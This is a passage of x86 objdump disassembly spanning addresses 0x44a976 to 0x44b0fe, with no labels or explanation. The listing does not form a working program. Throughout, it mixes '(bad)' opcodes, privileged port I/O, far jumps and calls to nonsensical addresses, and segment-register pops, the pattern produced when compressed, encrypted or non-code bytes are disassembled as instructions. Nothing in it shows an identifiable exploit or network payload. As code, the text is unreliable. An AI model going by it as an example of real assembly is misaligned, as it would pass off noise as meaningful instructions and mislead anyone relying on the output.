  44a976:	stos   BYTE PTR es:[edi],al
  44a977:	aad    0xbd
  44a979:	call   0xabc36a1d
  44a97e:	pop    ebx
  44a97f:	dec    ecx
  44a980:	mov    cl,cl
  44a982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a983:	mov    dh,0x8e
  44a985:	fist   WORD PTR [ebp-0x15d8dd0d]
  44a98b:	adc    DWORD PTR [ebx-0x7c],ecx
  44a98e:	and    DWORD PTR [ecx+0x5454f114],ebx
  44a994:	xchg   esi,eax
  44a995:	inc    esp
  44a996:	push   ds
  44a997:	rcr    DWORD PTR [edi+0x20ec6388],1
  44a99d:	stos   DWORD PTR es:[edi],eax
  44a99e:	xor    eax,0xc4ec78d4
  44a9a3:	in     al,dx
  44a9a4:	mov    BYTE PTR ds:0xc988c8f3,0x73
  44a9ab:	lock and edi,DWORD PTR [ecx+0x7e]
  44a9af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a9b0:	add    eax,0x87736e03
  44a9b5:	fbld   TBYTE PTR fs:[edx-0x73]
  44a9b9:	rcr    BYTE PTR [edx-0x45],1
  44a9bc:	aaa    
  44a9bd:	add    DWORD PTR [ecx-0xb0fe7ab],ebp
  44a9c3:	mov    eax,0x373544dc
  44a9c8:	or     dh,BYTE PTR [esi]
  44a9ca:	push   esi
  44a9cb:	xchg   edx,eax
  44a9cc:	ret    0xe8f8
  44a9cf:	int    0x5d
  44a9d1:	push   ecx
  44a9d2:	(bad)  
  44a9d3:	mov    dh,0x88
  44a9d5:	arpl   WORD PTR [ecx-0xc],dx
  44a9d8:	stos   BYTE PTR es:[edi],al
  44a9d9:	jge    0x44a989
  44a9db:	out    0x68,eax
  44a9dd:	add    al,BYTE PTR [eax-0x2]
  44a9e0:	mov    eax,ds:0x51630e81
  44a9e5:	mov    BYTE PTR [eax+0x3f],ah
  44a9e8:	test   BYTE PTR [ebx*4-0x309b7543],bh
  44a9ef:	rcl    BYTE PTR [edi-0x3cfef665],1
  44a9f5:	sbb    eax,0x2b80d6df
  44a9fa:	push   ds
  44a9fb:	jg     0x44a9f8
  44a9fd:	mov    esp,0x62379bf0
  44aa02:	das    
  44aa03:	leave  
  44aa04:	or     DWORD PTR ds:0xe5b60210,esp
  44aa0a:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  44aa0c:	sub    edi,DWORD PTR [edi+0x6f]
  44aa0f:	sub    BYTE PTR [edx+0x4ef39574],bh
  44aa15:	push   cs
  44aa16:	pusha  
  44aa17:	dec    ebp
  44aa18:	dec    ecx
  44aa19:	jbe    0x44aa63
  44aa1b:	add    al,0x5a
  44aa1d:	outs   dx,BYTE PTR es:[esi]
  44aa1f:	aam    0x2a
  44aa21:	add    bl,BYTE PTR [ebx-0x2c460760]
  44aa27:	or     DWORD PTR [eax+0x5015a559],0x60168208
  44aa31:	or     eax,edi
  44aa33:	aam    0x18
  44aa35:	xchg   esi,eax
  44aa36:	xor    esi,ebx
  44aa38:	gs int3 
  44aa3a:	sbb    dl,BYTE PTR [ebx+ecx*4-0x77]
  44aa3e:	push   ss
  44aa3f:	jg     0x44a9f7
  44aa41:	cmp    dh,BYTE PTR [ecx+0x1b7f78ad]
  44aa47:	stos   BYTE PTR es:[edi],al
  44aa48:	mov    esi,0x8a69d442
  44aa4d:	xlat   BYTE PTR gs:[ebx]
  44aa4f:	daa    
  44aa50:	sahf   
  44aa51:	push   edx
  44aa52:	pop    ds
  44aa53:	mov    edx,DWORD PTR [edi]
  44aa55:	cmp    al,0x1d
  44aa57:	mov    eax,ds:0xb856a420
  44aa5c:	mul    DWORD PTR ds:0xf4c85898
  44aa62:	nop
  44aa63:	inc    ebp
  44aa64:	jl     0x44aa81
  44aa66:	pop    ds
  44aa67:	jge    0x44aabd
  44aa69:	std    
  44aa6a:	pop    ebx
  44aa6b:	(bad)  
  44aa6c:	sahf   
  44aa6d:	mov    esi,0x4b1d431
  44aa72:	loopne 0x44aa4d
  44aa74:	jb     0x44aa38
  44aa76:	inc    ebx
  44aa77:	call   DWORD PTR [edi-0x361053f7]
  44aa7d:	inc    ebp
  44aa7e:	popa   
  44aa7f:	xchg   ecx,eax
  44aa80:	f2xm1  
  44aa82:	push   0x40
  44aa84:	cld    
  44aa85:	add    DWORD PTR [ebx+ecx*8+0x29],edi
  44aa89:	(bad)  
  44aa8a:	loopne 0x44aaf4
  44aa8c:	movaps xmm1,xmm4
  44aa8f:	or     DWORD PTR [eax-0x23762773],ecx
  44aa95:	sub    BYTE PTR [ebx+0x360347de],al
  44aa9b:	scas   al,BYTE PTR es:[edi]
  44aa9c:	cmc    
  44aa9d:	push   eax
  44aa9e:	xor    al,0xd0
  44aaa0:	ss dec esi
  44aaa2:	push   ds
  44aaa3:	lea    edx,[edi+0x74]
  44aaa6:	push   ds
  44aaa7:	enter  0x883e,0x8a
  44aaab:	aam    0x68
  44aaad:	dec    esi
  44aaae:	xlat   BYTE PTR ds:[ebx]
  44aaaf:	stc    
  44aab0:	add    DWORD PTR [ecx],ebx
  44aab2:	dec    esi
  44aab3:	fisttp WORD PTR [eax+0x5dc9f875]
  44aab9:	push   ebp
  44aaba:	sar    DWORD PTR [esi+0x7c],cl
  44aabd:	add    BYTE PTR [esi+0x66a4d12b],ah
  44aac3:	add    bh,BYTE PTR [edx+0x8]
  44aac6:	push   eax
  44aac7:	hlt    
  44aac8:	pusha  
  44aac9:	push   esp
  44aaca:	xor    al,0x1f
  44aacc:	jmp    0x60e1:0xa2734533
  44aad3:	lsl    ebp,WORD PTR [ebp+0x18]
  44aad7:	cmp    dl,bh
  44aad9:	add    eax,0x8f089552
  44aade:	mov    esp,0x93021a21
  44aae3:	and    eax,0x195f05ae
  44aae8:	sbb    al,0x46
  44aaea:	aam    0xf3
  44aaec:	lea    ebx,[edx+ecx*8]
  44aaef:	dec    ebp
  44aaf0:	or     ch,BYTE PTR [edx-0x5707b445]
  44aaf6:	xchg   esi,edx
  44aaf8:	mov    edi,edi
  44aafa:	lahf   
  44aafb:	jle    0x44aa83
  44aafd:	hlt    
  44aafe:	push   ecx
  44aaff:	and    eax,0x4f8402f9
  44ab04:	sub    cl,ah
  44ab06:	test   al,0x35
  44ab08:	pop    es
  44ab09:	dec    esi
  44ab0a:	push   eax
  44ab0b:	push   ebx
  44ab0c:	aas    
  44ab0d:	push   es
  44ab0e:	mov    edi,0xc38a4849
  44ab13:	aad    0xcd
  44ab15:	sub    al,bh
  44ab17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ab18:	es jmp 0x3cce:0xe194934e
  44ab20:	xlat   BYTE PTR ds:[ebx]
  44ab21:	inc    ebp
  44ab22:	inc    ebx
  44ab23:	outs   dx,BYTE PTR ds:[esi]
  44ab24:	add    BYTE PTR ss:[ebp+ebp*8-0x2239fccd],0xc9
  44ab2d:	add    eax,0xc4bf1593
  44ab32:	sbb    bl,BYTE PTR [ecx+ecx*4+0x6ebf103d]
  44ab39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ab3a:	jo     0x44ab41
  44ab3c:	lods   eax,DWORD PTR ds:[esi]
  44ab3d:	inc    esp
  44ab3e:	mov    ?,WORD PTR [eax]
  44ab40:	fimul  WORD PTR [edx+0x11]
  44ab43:	push   esp
  44ab44:	xor    eax,0x49be4f64
  44ab49:	popf   
  44ab4a:	pusha  
  44ab4b:	in     eax,0x9
  44ab4d:	add    al,BYTE PTR [edi-0x51]
  44ab50:	loopne 0x44ab63
  44ab52:	inc    esi
  44ab53:	aam    0xaa
  44ab55:	fsqrt  
  44ab57:	xchg   edx,eax
  44ab58:	dec    ebx
  44ab59:	jmp    0x15ccd133
  44ab5e:	loopne 0x44ab6f
  44ab60:	mov    dh,0x95
  44ab62:	outs   dx,BYTE PTR ds:[esi]
  44ab63:	test   al,0xd3
  44ab65:	add    eax,0x4435eb7a
  44ab6a:	icebp  
  44ab6b:	sti    
  44ab6c:	icebp  
  44ab6d:	outs   dx,DWORD PTR ds:[esi]
  44ab6e:	fs sub eax,0xf5a162bd
  44ab74:	cld    
  44ab75:	gs push ecx
  44ab77:	mov    ecx,0x344a147e
  44ab7c:	adc    al,0x88
  44ab7e:	rcl    BYTE PTR [ebp+0x2c],0xa9
  44ab82:	jae    0x44ab9a
  44ab84:	aad    0x7b
  44ab86:	shl    edi,cl
  44ab88:	mov    BYTE PTR [ebx+0x627224e0],ch
  44ab8e:	paddq  mm0,QWORD PTR [edi-0x178cf04]
  44ab95:	xchg   DWORD PTR [ecx+eiz*4+0x32b86188],esi
  44ab9c:	in     al,0x74
  44ab9e:	and    BYTE PTR [eax],ch
  44aba0:	push   ebp
  44aba1:	add    ebx,DWORD PTR [edx+0x4c]
  44aba4:	cdq    
  44aba5:	adc    BYTE PTR [esi],cl
  44aba7:	cli    
  44aba8:	(bad)  
  44aba9:	mov    eax,ds:0x7ed8771f
  44abae:	mov    ebx,0x5a97c812
  44abb3:	aad    0x4c
  44abb5:	shl    ebx,1
  44abb7:	bound  ebp,QWORD PTR [edi-0x70]
  44abba:	int3   
  44abbb:	push   ds
  44abbc:	mov    BYTE PTR [ecx-0xd],bl
  44abbf:	addr16 push edx
  44abc1:	(bad)  
  44abc2:	adc    dh,BYTE PTR [ecx]
  44abc4:	call   0xe6718bcc
  44abc9:	xchg   BYTE PTR [ecx],ah
  44abcb:	xchg   edx,eax
  44abcc:	rcr    dl,1
  44abce:	enter  0x88dd,0x35
  44abd2:	inc    esp
  44abd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44abd4:	sbb    cl,bh
  44abd6:	cld    
  44abd7:	jmp    0x1262c130
  44abdc:	ja     0x44ac07
  44abde:	adc    DWORD PTR [esi+edx*2],edx
  44abe1:	imul   esi,DWORD PTR [esi+0x6e],0x494dab8b
  44abe8:	push   ds
  44abe9:	outs   dx,DWORD PTR ds:[esi]
  44abea:	scas   eax,DWORD PTR es:[edi]
  44abeb:	xor    eax,0xaa332068
  44abf0:	inc    eax
  44abf1:	in     eax,dx
  44abf2:	fiadd  WORD PTR [ebp-0x17]
  44abf5:	push   DWORD PTR [eax-0x17c56746]
  44abfb:	jmp    0x44ac3e
  44abfd:	jg     0x44abde
  44abff:	ret    
  44ac00:	cmp    eax,0x67b9bb2f
  44ac05:	add    BYTE PTR [edi+ebx*4-0x6b38c819],dh
  44ac0c:	xor    cl,dl
  44ac0e:	in     al,dx
  44ac0f:	popf   
  44ac10:	mov    DWORD PTR [ecx],ecx
  44ac12:	in     al,0x76
  44ac14:	repnz in al,dx
  44ac16:	repz in eax,0xbc
  44ac19:	add    dl,BYTE PTR [esi]
  44ac1b:	adc    ebp,DWORD PTR [ebx+0x65]
  44ac1e:	(bad)  
  44ac1f:	clc    
  44ac20:	inc    edx
  44ac21:	cmp    eax,0x4d79a37d
  44ac26:	adc    ch,0x85
  44ac29:	inc    esi
  44ac2a:	pusha  
  44ac2b:	das    
  44ac2c:	hlt    
  44ac2d:	mov    WORD PTR [ebp-0x474a76ab],gs
  44ac33:	and    ebp,esp
  44ac35:	fnstsw WORD PTR [ebp+ebp*2+0x7f]
  44ac39:	xchg   edx,eax
  44ac3a:	pop    ds
  44ac3b:	sti    
  44ac3c:	repnz outs dx,BYTE PTR ds:[esi]
  44ac3e:	push   0xac09324e
  44ac43:	aad    0xa5
  44ac45:	adc    BYTE PTR [edx],bl
  44ac47:	addr16 and al,0xcd
  44ac4a:	ret    
  44ac4b:	mov    DWORD PTR fs:[ebx+0x56],edx
  44ac4f:	xchg   ebx,eax
  44ac50:	jno    0x44abe7
  44ac52:	push   ebx
  44ac53:	mov    dl,0x47
  44ac55:	add    ebx,DWORD PTR [eax-0x75d7568e]
  44ac5b:	int    0xae
  44ac5d:	xor    ebx,DWORD PTR [esi]
  44ac5f:	mov    ebx,0x327a2cb
  44ac64:	repnz cmc 
  44ac66:	sbb    BYTE PTR [esi+0x2b538dc1],0xc8
  44ac6d:	iret   
  44ac6e:	loop   0x44ac45
  44ac70:	sub    bh,bl
  44ac72:	sahf   
  44ac73:	ror    DWORD PTR [eax+0x59a73e57],0x50
  44ac7a:	ror    DWORD PTR [ebp+0x749e032f],0x54
  44ac81:	mov    bl,BYTE PTR [edx+0x27f8b50e]
  44ac87:	pop    ecx
  44ac88:	mov    BYTE PTR [ecx-0x1ef1fae4],dl
  44ac8e:	jle    0x44aca8
  44ac90:	jno    0x44ac95
  44ac92:	pop    eax
  44ac93:	mov    al,ds:0xea12d457
  44ac98:	push   ss
  44ac99:	push   cs
  44ac9a:	pop    ds
  44ac9b:	jmp    0xdb0abdb1
  44aca0:	test   BYTE PTR [esi],0x0
  44aca3:	test   DWORD PTR [edi-0x49d1ddfe],0xbaa0ed
  44acad:	lock jge 0x44ac7b
  44acb0:	rcl    ebx,cl
  44acb2:	imul   edx,DWORD PTR [edi],0xb62c904f
  44acb8:	mov    BYTE PTR [edx-0x781aa8c7],cl
  44acbe:	or     al,0xce
  44acc0:	mov    DWORD PTR [ebp-0x3e2a0204],edx
  44acc6:	cmc    
  44acc7:	mov    dl,0x3c
  44acc9:	add    esp,DWORD PTR [esi+ebp*4+0x6b52796a]
  44acd0:	cmp    bl,BYTE PTR [edx]
  44acd2:	push   ds
  44acd3:	cdq    
  44acd4:	js     0x44ac5a
  44acd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44acd7:	call   0xed7793f2
  44acdc:	retf   0xbfa7
  44acdf:	aaa    
  44ace0:	mov    ds:0xb2dece02,eax
  44ace5:	icebp  
  44ace6:	rcl    edx,cl
  44ace8:	xor    eax,0xe60f1f7e
  44aced:	or     bl,BYTE PTR [eax+edx*8-0x60]
  44acf1:	(bad)  
  44acf2:	dec    ebp
  44acf3:	aad    0xe3
  44acf5:	xchg   edi,eax
  44acf6:	xchg   esi,eax
  44acf7:	jle    0x44acb6
  44acf9:	sar    ecx,0xab
  44acfc:	mov    BYTE PTR ds:0x18f00909,cl
  44ad02:	mov    bh,0x8
  44ad04:	cli    
  44ad05:	sti    
  44ad06:	(bad)  
  44ad07:	aam    0xa1
  44ad09:	test   esp,esi
  44ad0b:	out    0xae,eax
  44ad0d:	mov    esp,0xbbf6224c
  44ad12:	dec    ebp
  44ad13:	pushf  
  44ad14:	add    BYTE PTR [ecx],dl
  44ad16:	push   ds
  44ad17:	pop    ds
  44ad18:	add    eax,0x8cbd2595
  44ad1d:	add    cl,BYTE PTR [edx]
  44ad1f:	or     DWORD PTR [esi],esp
  44ad21:	int3   
  44ad22:	mov    eax,ds:0x5841b557
  44ad27:	dec    ebx
  44ad28:	sub    ecx,DWORD PTR ds:0xb0ee6860
  44ad2e:	pop    ebp
  44ad2f:	add    eax,0xa672028d
  44ad34:	inc    ebx
  44ad35:	and    DWORD PTR [edx+0x38],ebp
  44ad38:	and    eax,0xa9776dea
  44ad3d:	mov    edi,0x3a0914ae
  44ad42:	jl     0x44ad2b
  44ad44:	pop    DWORD PTR [edx]
  44ad46:	fisubr WORD PTR [esi]
  44ad48:	cmp    al,0x69
  44ad4a:	ja     0x44ad58
  44ad4c:	inc    esp
  44ad4d:	inc    ebp
  44ad4e:	and    eax,DWORD PTR [ebp+0x30]
  44ad51:	pop    esi
  44ad52:	dec    eax
  44ad53:	aam    0x70
  44ad55:	test   eax,0xf4e26fd
  44ad5a:	rcl    ebp,cl
  44ad5c:	lods   eax,DWORD PTR ds:[esi]
  44ad5d:	xchg   edx,eax
  44ad5e:	mov    ecx,ds
  44ad60:	retf   
  44ad61:	jecxz  0x44ada5
  44ad63:	das    
  44ad64:	jno    0x44ace8
  44ad66:	pusha  
  44ad67:	xor    eax,0xb2993992
  44ad6c:	clc    
  44ad6d:	xlat   BYTE PTR ds:[ebx]
  44ad6e:	fcmovbe st,st(4)
  44ad70:	into   
  44ad71:	out    0x52,al
  44ad73:	ret    0xbe55
  44ad76:	fwait
  44ad77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44ad78:	outs   dx,BYTE PTR fs:[esi]
  44ad7a:	pop    ds
  44ad7b:	test   DWORD PTR [ebx],ebp
  44ad7d:	out    dx,al
  44ad7e:	out    0x35,eax
  44ad80:	vmread DWORD PTR [ecx],edx
  44ad83:	push   ebp
  44ad84:	push   edi
  44ad85:	adc    BYTE PTR [esi],bl
  44ad87:	dec    ebx
  44ad88:	(bad)  
  44ad89:	out    0x5f,eax
  44ad8b:	repz xor BYTE PTR [edx],dh
  44ad8e:	pusha  
  44ad8f:	test   eax,0xb8a2c374
  44ad94:	jmp    0xe202:0x2b930f85
  44ad9b:	mov    DWORD PTR [eax],0xaad65639
  44ada1:	rcr    DWORD PTR [edi],0xb3
  44ada4:	sbb    eax,DWORD PTR [si-0x7e]
  44ada8:	pop    ss
  44ada9:	imul   ecx,DWORD PTR [ebx],0xa2633cd
  44adaf:	es nop
  44adb1:	test   BYTE PTR [ecx-0x218fa87f],ah
  44adb7:	jne    0x44ade4
  44adb9:	jnp    0x44ae1c
  44adbb:	in     eax,0xbc
  44adbd:	jmp    0x6101:0xb3e3668b
  44adc4:	or     DWORD PTR [eax+0x58c596e],ebx
  44adca:	cs cdq 
  44adcc:	inc    ecx
  44adcd:	test   al,0xd6
  44adcf:	(bad)  
  44add0:	in     al,0x23
  44add2:	pop    ds
  44add3:	xor    eax,0xba1e1a73
  44add8:	dec    ecx
  44add9:	cmp    ch,bl
  44addb:	pop    esp
  44addc:	lods   al,BYTE PTR ds:[esi]
  44addd:	(bad)  
  44adde:	pop    ds
  44addf:	ror    BYTE PTR [edx+0x6914c75e],cl
  44ade5:	xor    bl,BYTE PTR [esi]
  44ade7:	imul   edx,DWORD PTR [esi],0xfa1217b7
  44aded:	pop    esp
  44adee:	and    ch,BYTE PTR [ebp-0x355bc304]
  44adf4:	and    DWORD PTR [eax+eiz*1],esp
  44adf7:	jecxz  0x44ae36
  44adf9:	mov    ebx,0x695d972e
  44adfe:	pop    ds
  44adff:	imul   ebp,ebp,0xffffff9f
  44ae02:	int    0xda
  44ae04:	fsub   DWORD PTR [ecx]
  44ae06:	and    DWORD PTR [edx+0x3517f63c],ebp
  44ae0c:	sbb    DWORD PTR [ebx],eax
  44ae0e:	lahf   
  44ae0f:	xor    BYTE PTR ss:[ebp+0x1f],0xf3
  44ae14:	mov    DWORD PTR [esp+esi*2-0x4f],ecx
  44ae18:	adc    al,0x90
  44ae1a:	add    DWORD PTR [eax+edi*2+0x1f],0x46
  44ae1f:	jne    0x44adb0
  44ae21:	fnstcw WORD PTR [ebx-0x7266f6f6]
  44ae27:	lahf   
  44ae28:	mov    BYTE PTR [ecx],dh
  44ae2a:	rcr    DWORD PTR [eax+ecx*4-0x3c],cl
  44ae2e:	add    al,0xd1
  44ae30:	pushf  
  44ae31:	add    eax,0xd72bcad4
  44ae36:	lods   al,BYTE PTR cs:[esi]
  44ae38:	pop    eax
  44ae39:	mov    esp,0x82143b65
  44ae3e:	xchg   edi,eax
  44ae3f:	int    0x7a
  44ae41:	adc    eax,0xb936607f
  44ae46:	xchg   edx,eax
  44ae47:	adc    al,0x1b
  44ae49:	add    ecx,eax
  44ae4b:	fld    TBYTE PTR [ebx-0x38]
  44ae4e:	clc    
  44ae4f:	jg     0x44ae8c
  44ae51:	xchg   esi,eax
  44ae52:	or     ebx,ebp
  44ae54:	cmc    
  44ae55:	xchg   edi,eax
  44ae56:	mov    ax,0xe8ff
  44ae5a:	inc    esp
  44ae5b:	push   esp
  44ae5c:	dec    ebx
  44ae5d:	test   eax,0x5a918cc
  44ae62:	push   0xf7df6e6f
  44ae67:	lods   eax,DWORD PTR ds:[esi]
  44ae68:	lds    ebp,FWORD PTR [eax+0x56]
  44ae6b:	std    
  44ae6c:	inc    edi
  44ae6d:	pop    ds
  44ae6e:	idiv   DWORD PTR [edx+ebp*8+0x28b84035]
  44ae75:	mov    al,ds:0x7b9a6446
  44ae7a:	push   ds
  44ae7b:	rcl    ah,1
  44ae7d:	(bad)  [edi-0x1358773a]
  44ae83:	rcr    DWORD PTR [esi+0x3e],cl
  44ae86:	lds    eax,FWORD PTR [eax]
  44ae88:	adc    DWORD PTR [edx+0x6389cd03],ebp
  44ae8e:	cmp    eax,0x75e260ea
  44ae93:	fcmovnu st,st(0)
  44ae95:	ins    DWORD PTR es:[edi],dx
  44ae96:	and    eax,0x7d03881c
  44ae9b:	mov    BYTE PTR [esi-0x43],bl
  44ae9e:	ins    BYTE PTR es:[edi],dx
  44ae9f:	shld   DWORD PTR [edx-0x62691f5b],ecx,cl
  44aea6:	mov    dh,0x93
  44aea8:	dec    edi
  44aea9:	test   eax,0xf889cc83
  44aeae:	mov    bh,0x4b
  44aeb0:	mov    edx,DWORD PTR [ebp-0x62]
  44aeb3:	in     eax,0x86
  44aeb5:	jmp    0x44aed9
  44aeb7:	int3   
  44aeb8:	enter  0xcddf,0xd4
  44aebc:	jns    0x44af11
  44aebe:	std    
  44aebf:	enter  0x830a,0xea
  44aec3:	(bad)  [ecx+0x172c42e1]
  44aec9:	sub    BYTE PTR [esi-0x2d],dl
  44aecc:	add    BYTE PTR es:[esi+0x9],dh
  44aed0:	pop    ds
  44aed1:	mov    bl,BYTE PTR [esp+ebx*2-0x370a1dd7]
  44aed8:	push   ebp
  44aed9:	adc    DWORD PTR [esi],ebx
  44aedb:	int    0x27
  44aedd:	iret   
  44aede:	scas   al,BYTE PTR es:[edi]
  44aedf:	jmp    0x62b0:0xf01bc6ab
  44aee6:	dec    edx
  44aee7:	push   ebx
  44aee8:	push   eax
  44aee9:	jbe    0x44ae6f
  44aeeb:	and    DWORD PTR [ecx+0xa1b623b],ecx
  44aef1:	mov    ebx,DWORD PTR [edi-0x49fdcf1a]
  44aef7:	cmp    DWORD PTR [eax+edx*1],ebp
  44aefa:	sub    dl,0xd1
  44aefd:	push   cs
  44aefe:	push   ss
  44aeff:	cmp    al,0x88
  44af01:	sbb    eax,0xa6e0d1f3
  44af06:	dec    edi
  44af07:	ret    
  44af08:	add    BYTE PTR [edi-0x10],0x92
  44af0c:	cmp    eax,0x71c14103
  44af11:	push   eax
  44af12:	mov    ?,esp
  44af14:	mov    cl,al
  44af16:	enter  0xd223,0xb
  44af1a:	mov    esp,0x2a008b73
  44af1f:	out    0x46,eax
  44af21:	push   edi
  44af22:	jb     0x44af8c
  44af24:	rcr    esp,1
  44af26:	adc    BYTE PTR ds:0xb60ce7a,ah
  44af2c:	mov    dl,0x23
  44af2e:	xor    eax,0xd3769164
  44af34:	mov    esi,0x4ad0864
  44af39:	clc    
  44af3a:	fist   WORD PTR [eax-0x7b]
  44af3d:	inc    ecx
  44af3e:	pop    ds
  44af3f:	mov    ecx,0x5b5fbcba
  44af44:	nop
  44af45:	sub    al,0xa0
  44af47:	aam    0xdb
  44af49:	mov    eax,0xa0e56a36
  44af4f:	or     cl,BYTE PTR [ebp-0x2b]
  44af52:	pusha  
  44af53:	(bad)  
  44af54:	mov    ebx,0x40e2cf8e
  44af59:	lahf   
  44af5a:	enter  0x32d4,0x7e
  44af5e:	dec    edi
  44af5f:	stos   DWORD PTR es:[edi],eax
  44af60:	out    dx,al
  44af61:	out    0x10,eax
  44af63:	loopne 0x44aeed
  44af65:	xchg   ebp,eax
  44af66:	sub    al,0x60
  44af68:	ror    bh,cl
  44af6a:	cmp    DWORD PTR [ebx+0xe],ecx
  44af6d:	adc    al,0x2e
  44af6f:	test   eax,0xed5d2ebb
  44af74:	sub    ebx,DWORD PTR [esi-0x3b779f26]
  44af7a:	cs mov esp,0xd00cd170
  44af80:	mov    BYTE PTR [edi-0xb066e4e],bh
  44af86:	push   ebx
  44af87:	jno    0x44af3c
  44af89:	add    cl,ah
  44af8b:	xchg   edx,eax
  44af8c:	pop    ebp
  44af8d:	dec    edi
  44af8e:	sbb    eax,0x64f66a3d
  44af93:	aas    
  44af94:	pop    es
  44af95:	and    ebx,ebx
  44af97:	loope  0x44af8d
  44af99:	mov    ch,0x3e
  44af9b:	stos   BYTE PTR es:[edi],al
  44af9c:	mov    ecx,0x4ec3437f
  44afa1:	loop   0x44afe8
  44afa3:	sub    al,0x42
  44afa5:	adc    ebx,DWORD PTR [edi]
  44afa7:	scas   eax,DWORD PTR es:[edi]
  44afa8:	(bad)  
  44afa9:	sub    esp,DWORD PTR [ecx+0x32]
  44afac:	sub    al,0xcb
  44afae:	enter  0xad9b,0x87
  44afb2:	jg     0x44b006
  44afb4:	push   esp
  44afb5:	push   0xb2c90fee
  44afba:	outs   dx,DWORD PTR ds:[esi]
  44afbb:	dec    esp
  44afbc:	fwait
  44afbd:	sbb    edx,DWORD PTR [ebx+0x55]
  44afc0:	ins    DWORD PTR es:[edi],dx
  44afc1:	add    ch,BYTE PTR [eax-0x11]
  44afc4:	xor    BYTE PTR ds:0x1040bb8d,ch
  44afca:	pop    ecx
  44afcb:	cwde   
  44afcc:	mov    DWORD PTR [ecx-0x7465b37e],esp
  44afd2:	jnp    0x44afc5
  44afd4:	sub    DWORD PTR [ebp-0x5d],ecx
  44afd7:	jmp    0x44b012
  44afd9:	mov    eax,0xcaaadc00
  44afde:	mov    eax,ds:0x4dc927d5
  44afe3:	retf   0x106d
  44afe6:	pop    ds
  44afe7:	les    ebx,FWORD PTR [edx+0x3de94ec7]
  44afed:	add    dh,dh
  44afef:	xlat   BYTE PTR ds:[ebx]
  44aff0:	push   esi
  44aff1:	xchg   esp,eax
  44aff2:	pop    ebx
  44aff3:	aam    0xbe
  44aff5:	and    al,BYTE PTR [esi+0x36]
  44aff8:	mov    dl,0xab
  44affa:	ret    
  44affb:	ror    BYTE PTR [ecx+0x1885f7a9],cl
  44b001:	add    DWORD PTR [ebx+ebx*4-0x1a],eax
  44b005:	add    dl,dh
  44b007:	(bad)  
  44b008:	and    al,0xb
  44b00a:	mov    DWORD PTR [ebx],esi
  44b00c:	lods   al,BYTE PTR ds:[esi]
  44b00d:	in     eax,dx
  44b00e:	xlat   BYTE PTR ds:[ebx]
  44b00f:	push   edi
  44b010:	and    BYTE PTR [eax],al
  44b012:	out    0xc3,al
  44b014:	push   edi
  44b015:	dec    esi
  44b016:	fdivr  st,st(1)
  44b018:	mov    dl,ah
  44b01a:	and    al,0x49
  44b01c:	sahf   
  44b01d:	enter  0xee7c,0x88
  44b021:	inc    edi
  44b022:	popa   
  44b023:	mov    esi,0x68039e51
  44b028:	push   edx
  44b029:	mov    BYTE PTR [ebx+0x42],ch
  44b02c:	mov    DWORD PTR [ecx+0x71],edx
  44b02f:	mov    ebp,0xe0f4ccfc
  44b034:	mov    BYTE PTR [ebx-0x134ed168],ah
  44b03a:	push   edx
  44b03b:	adc    al,BYTE PTR ds:0xc39e9402
  44b041:	cmp    ebp,DWORD PTR [ecx+0x1e46cdb4]
  44b047:	dec    edi
  44b048:	jle    0x44b071
  44b04a:	xor    esi,DWORD PTR [eax+0x5c]
  44b04d:	cmp    esp,DWORD PTR [eax+0x4176c6d2]
  44b053:	or     dh,dl
  44b055:	scas   eax,DWORD PTR es:[edi]
  44b056:	jg     0x44b05a
  44b058:	fs sti 
  44b05a:	pusha  
  44b05b:	mov    ebx,0x580c965e
  44b060:	out    0x8a,al
  44b062:	dec    esi
  44b063:	mov    ebp,0xb3bacd98
  44b068:	xchg   ecx,eax
  44b069:	adc    BYTE PTR [esi],bl
  44b06b:	popf   
  44b06c:	jae    0x44b0cc
  44b06e:	and    al,0x8f
  44b070:	inc    esi
  44b071:	aam    0xe6
  44b073:	aad    0xc
  44b075:	and    eax,0xe1379ced
  44b07a:	pop    ss
  44b07b:	cmp    cl,BYTE PTR [eax+0x5e2e5193]
  44b081:	dec    edx
  44b082:	and    ecx,DWORD PTR [eax]
  44b084:	inc    eax
  44b085:	xor    ch,ch
  44b087:	aad    0x4f
  44b089:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  44b08b:	int    0xfb
  44b08d:	pop    edx
  44b08e:	pop    ss
  44b08f:	test   eax,0xf9bc0994
  44b094:	push   ds
  44b095:	inc    ebx
  44b096:	es dec ecx
  44b098:	pusha  
  44b099:	inc    ebx
  44b09a:	repnz xlat BYTE PTR ds:[ebx]
  44b09c:	mov    ds:0x4487d936,al
  44b0a1:	mov    al,0x5
  44b0a3:	(bad)  
  44b0a4:	dec    BYTE PTR [ebx]
  44b0a6:	pusha  
  44b0a7:	jge    0x44b0d3
  44b0a9:	int3   
  44b0aa:	ds mov dh,0xc2
  44b0ad:	xchg   DWORD PTR [ebx+0x330dc89f],ebx
  44b0b3:	xlat   BYTE PTR ds:[ebx]
  44b0b4:	fucom  st(5)
  44b0b6:	mov    ds:0x609cadd2,eax
  44b0bb:	popf   
  44b0bc:	jnp    0x44b110
  44b0be:	bound  ecx,QWORD PTR [edi]
  44b0c0:	push   0x74b0ab71
  44b0c5:	test   al,0xe2
  44b0c7:	aam    0x7
  44b0c9:	jp     0x44b08a
  44b0cb:	mov    ecx,0xe52b059c
  44b0d0:	bound  ecx,QWORD PTR [edx+0x1e]
  44b0d3:	imul   ebp,ebp,0xffffffc2
  44b0d6:	mov    ch,BYTE PTR [esi+0x782ea6df]
  44b0dc:	mov    al,BYTE PTR [ebp+0x56]
  44b0df:	aam    0xfd
  44b0e1:	std    
  44b0e2:	nop
  44b0e3:	pop    ecx
  44b0e4:	pop    eax
  44b0e5:	sub    ebx,DWORD PTR [esi]
  44b0e7:	ret    
  44b0e8:	dec    eax
  44b0e9:	fmul   DWORD PTR [edx-0x25]
  44b0ec:	test   al,0xaf
  44b0ee:	push   ecx
  44b0ef:	aad    0xca
  44b0f1:	cs pop edi
  44b0f3:	(bad)  
  44b0f4:	fidiv  DWORD PTR [eax+ebp*1+0x5f88d3]
  44b0fb:	(bad)  
  44b0fc:	fdivp  st(2),st
  44b0fe:	lock ss daa 
